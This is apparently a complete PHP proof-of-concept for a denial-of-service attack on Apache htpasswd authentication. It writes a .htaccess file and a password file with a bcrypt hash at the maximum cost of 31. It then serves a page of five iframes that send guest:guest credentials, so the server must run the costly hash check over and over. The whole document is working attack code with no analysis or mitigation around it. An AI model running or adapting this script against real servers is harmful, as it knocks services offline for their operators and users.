<?php

/* poc for htpasswd denial of service */

$path = dirname(__FILE__)."/pwdos";

$htaccess = <<<HTACCESS
AuthType Basic
AuthName "xyz"
AuthUserFile $path/pass
require valid-user
HTACCESS;

$htpasswd = 'guest:$2y$31$m6a3PHTWHScH6CkJObcRDOFbhalC3O/mz58ZVC8fLwX4OZTLPJ9G.';

mkdir($path);
file_put_contents($path."/.htaccess", $htaccess);
file_put_contents($path."/pass", $htpasswd);

$url=$_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST'].substr($_SERVER['REQUEST_URI'], 0, strrpos($_SERVER['REQUEST_URI'], '/') + 1)."pwdos/";
$authurl=$_SERVER['REQUEST_SCHEME']."://guest:guest@".$_SERVER['HTTP_HOST'].substr($_SERVER['REQUEST_URI'], 0, strrpos($_SERVER['REQUEST_URI'], '/') + 1)."pwdos/";

?>
<!DOCTYPE html>
<html><head><title>...</title></head>
<body>
<iframe src="<?php echo $authurl; ?>"></iframe>
<iframe src="<?php echo $authurl; ?>"></iframe>
<iframe src="<?php echo $authurl; ?>"></iframe>
<iframe src="<?php echo $authurl; ?>"></iframe>
<iframe src="<?php echo $authurl; ?>"></iframe>
</body></html>
